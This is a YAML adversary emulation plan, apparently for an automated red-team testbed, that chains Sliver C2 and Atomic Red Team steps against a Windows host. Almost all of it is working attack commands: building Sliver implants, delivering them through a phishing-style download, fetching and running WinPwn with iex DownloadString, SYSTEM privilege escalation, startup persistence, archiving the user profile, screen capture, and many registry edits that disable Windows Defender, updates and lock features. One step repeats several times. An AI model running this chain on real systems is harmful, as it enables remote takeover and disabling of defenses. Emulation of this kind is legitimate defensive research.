emulation_plan_details:
  adversary_name: 27_C0006
  creation_time: 2025-06-25 01:56:47 UTC+0000
attack_action_sequence:
  - uuid: bb2176c4-855e-4b52-ab03-5fe2e58d8129
    name: Build DLL Sliver implant
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?file - file)
      - (dll_file ?file - file)
      - (file_prepared_local ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 5b852063-ca39-4600-b246-024897721010
    name: Simulate the victim execute a DLL file on its machine
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description: This step simulates the victim executes a DLL file on its machine.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt)
        regsvr32 #{DLL_PATH}
    arguments:
      DLL_PATH:
        default:
        description: Saved path of the DLL file
        type:
    preconditions:
      - (file_exists ?path - path ?file - file ?t - host)
      - (dll_file ?file - file)
    effects:
      - (file_executed ?file - file ?t - host)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 3b3809b6-a54b-4f5b-8aff-cb51f2e97b34
    name: Process Discovery - Get-Process
    id:
      - T1057
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - Process Discovery
    description: |
      Utilize Get-Process PowerShell cmdlet to identify processes.

      Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
    execution:
      executor: Powershell Executor
      command: |
        Get-Process
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (process_info_known ?target - host)
  - uuid: 36b514af-486f-44ad-9f56-09c9d904851d
    name: Get Current Working Directory
    id:
      - T1083
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - File and Directory Discovery
    description: The `pwd` command returns the current working directory of the remote
      system. It helps to determine the current directory where commands are being
      executed on the remote machine, which is crucial for file management and executing
      further commands. The command includes flags for setting a timeout.
    execution:
      executor: Sliver Executor
      command: pwd(#{SessionID})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (current_directory_info_known ?t - host)
  - uuid: f9c1197c-c5ef-4368-a10c-3a53003dbfbf
    name: Remote Directory Listing
    id:
      - T1083
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - File and Directory Discovery
    description: The `ls <remote path>` command lists files and directories in a specified
      remote path or the current directory if no path is provided. By default, it
      sorts listings by name in ascending order, but can also sort by size or modified
      time, with options to reverse the order. The command includes flags for sorting,
      reversing order, and setting a timeout.
    execution:
      executor: Sliver Executor
      command: ls(#{SessionID})
    arguments:
      SessionID:
        default:
        description: The session ID of the active Sliver connection.
        type:
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (file_info_known ?t - host)
  - uuid: 877d3366-eab3-4f43-bd24-26b37eb70266
    name: Remote Processes List
    id:
      - T1057
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - Process Discovery
    description: The `ps` command lists all running processes on a remote system.
      It returns a list of processes with details such as the process ID (PID) and
      executable name. The command includes flags for exe, overflowing terminal width,
      filtering based on owner/pid, printing command line arguments, skipping the
      first n page(s), printing process tree and setting outtime.
    execution:
      executor: Sliver Executor
      command: ps(#{SessionID})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (processes_info_known ?t - host)
  - uuid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
    name: WinPwn - General privesc checks
    id:
      - T1082
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - System Information Discovery
    description: General privesc checks using the otherchecks function of WinPwn
    execution:
      executor: Powershell Executor
      command: |-
        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (system_time_info_known ?target - host)
  - uuid: bc50eb97-4a6d-4a9d-b0b2-e9cf623a9106
    name: Build the executable file (service) of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a service executable payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format service --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (service_payload ?p - payload)
      - (file_payload ?p - payload ?file - file)
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
    arguments:
      HOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - (unallocated ?path - path)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
      - (file_executed_as_root ?f - file ?t - host)
      - ~(unallocated ?path - path)
  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
    arguments:
      HOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - (unallocated ?path - path)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
      - (file_executed_as_root ?f - file ?t - host)
      - ~(unallocated ?path - path)
  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
    arguments:
      HOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - (unallocated ?path - path)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
      - (file_executed_as_root ?f - file ?t - host)
      - ~(unallocated ?path - path)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
    arguments:
      HOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - (unallocated ?path - path)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
      - (file_executed_as_root ?f - file ?t - host)
      - ~(unallocated ?path - path)
  - uuid: 8834b65a-f808-4ece-ad7e-2acdf647aafa
    name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
    id:
      - T1547.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Persistence
      - Privilege Escalation
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value 
      to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
    execution:
      executor: Powershell Executor
      command: |
        New-Item -ItemType Directory -path "#{new_startup_folder}"
        Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
    arguments:
      new_startup_folder:
        description: new startup folder to replace standard one
        type: string
        default: $env:TMP\atomictest
      payload:
        description: 'executable to be placed in new startup location '
        type: string
        default: C:\Windows\System32\calc.exe
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (file_exists ?payload - path ?file - file ?target - host)
      - (exe_file ?file - file)
    effects:
      - (file_execution_at_startup ?file - file ?target - host)
  - uuid: f7f31777-1bbf-4ddc-b7a1-af9f46a5299b
    name: Obtain a persistent Sliver Executor
    id:
      - 
    source: Manual
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Persistence
    technique:
      - 
    description: |
      Obtain the persistency of Sliver Executor via scheduled payload file execution.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?f - file)
      - operator: or
        operands:
          - (file_execution_at_time ?f - file ?target - host)
          - (file_execution_at_startup ?f - file ?target - host)
      - (unallocated ?s - executor)
    effects:
      - (persistent_sliver_session ?s - executor ?target - host)
      - ~(unallocated ?s - executor)
  - uuid: 2e8f1a9c-0b5e-4a7c-b6d4-9a8b2d3c5f1e
    name: Create Directory
    id:
      - T1106
    source: Sliver
    supported_platforms:
      - windows
      - linux
    tactics:
      - Persistence
    technique:
      - File System Permissions Modification
    description: The `mkdir` command creates a new directory on the target system.
    execution:
      executor: Sliver Executor
      command: mkdir (#{remote_path},#{SessionID})
    arguments:
      remote_path:
        description: Full path of the directory to create
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?target - host)
          - (os_linux ?target - host)
      - (sliver_session ?executorID - executor ?target - host)
    effects:
      - (dir_exists ?path - path ?dir - dir ?target - host)
  - uuid: 41410c60-614d-4b9d-b66e-b0192dd9c597
    name: Compress Data for Exfiltration With PowerShell
    id:
      - T1560
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Archive Collected Data
    description: |
      An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.
      When the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory 
    execution:
      executor: Powershell Executor
      command: |
        dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
    arguments:
      input_file:
        description: Path that should be compressed into our output file
        type: path
        default: $env:USERPROFILE
      output_file:
        description: Path where resulting compressed data should be placed
        type: path
        default: $env:USERPROFILE\T1560-data-ps.zip
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (dir_exists ?input_file - path ?dir - dir ?target - host)
    effects:
      - (dir_data_saved ?dir - dir ?file - file)
      - (file_exists ?output_file - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: e9313014-985a-48ef-80d9-cde604ffc187
    name: Windows Screen Capture (CopyFromScreen)
    id:
      - T1113
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Screen Capture
    description: |
      Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.

      [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
    execution:
      executor: Powershell Executor
      command: |
        Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")
    arguments:
      output_file:
        description: Path where captured results will be placed
        type: path
        default: $env:TEMP\T1113.png
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (screenshot_data_saved ?file - file ?target - host)
      - (file_exists ?output_file - path ?file - file ?target - host)
      - (png_file ?file - file)
  - uuid: 5a1d2b9f-4e7f-8a4d-3f7a-6c2e5e9f9f7c
    name: Privilege Escalation
    id:
      - T1134
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Privilege Escalation
    technique:
      - Access Token Manipulation
    description: The `get_system` command attempts to gain SYSTEM-level privileges.
    execution:
      executor: Sliver Executor
      command: get_system (#{hosting_process},#{config},#{SessionID})
    arguments:
      hosting_process:
        description: Target process ID or name for privilege escalation
      config:
        description: Configuration options for escalation method
        default: Service
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?target - host)
      - (sliver_session ?executorID - executor ?target - host)
    effects:
      - (elevated_executor ?executorID - executor)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 1f6743da-6ecc-4a93-b03f-dc357e4b313f
    name: Tamper with Windows Defender Registry - Reg.exe
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Disable Windows Defender by tampering with windows defender registry using the utility "reg.exe"
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul 
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (windows_defender_disabled ?target - host)
  - uuid: 3e757ce7-eca0-411a-9583-1c33b8508d52
    name: Windows HideSCANetwork Group Policy Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. 
      Take note that some Group Policy changes might require a restart to take effect.
      See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (networking_icon_group_policy_disabled ?target - host)
  - uuid: 01b20ca8-c7a3-4d86-af59-059f15ed5474
    name: Disable Windows OS Auto Update
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (auto_update_disabled ?target - host)
  - uuid: 003f466a-6010-4b15-803a-cbb478a314d7
    name: Disable Windows Toast Notifications
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.
      See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (toast_notification_disabled ?target - host)
  - uuid: 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56
    name: Disable Windows Lock Workstation Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.
      See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (lock_workstation_disabled ?target - host)
  - uuid: 2a78362e-b79a-4482-8e24-be397bce4d85
    name: Safe Mode Boot
    id:
      - T1562.009
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Safe Mode Boot'
    description: Allows adversaries to abuse safe mode to disable endpoint defenses
      that may not start with limited boot
    execution:
      executor: Elevated Command Prompt Executor
      command: bcdedit /set safeboot network
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (endpoint_defense_disabled ?target - host)
  - uuid: 4b81bcfa-fb0a-45e9-90c2-e3efe5160140
    name: Disable Remote Desktop Security Settings Through Registry
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation
    execution:
      executor: Command Prompt Executor
      command: |
        reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (rdp_security_settings_disabled ?target - host)
  - uuid: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
    name: Remove Windows Defender Definition Files
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
      On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
      command will say completed.

      https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (anti_malware_disabled ?target - host)
  - uuid: 6e0d1131-2d7e-4905-8ca5-d6172f05d03d
    name: Disable Windows Shutdown Button
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.
      See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (shutdown_button_disabled ?target - host)
testbed_requirement:
  host11:
    os: windows
    cve: []
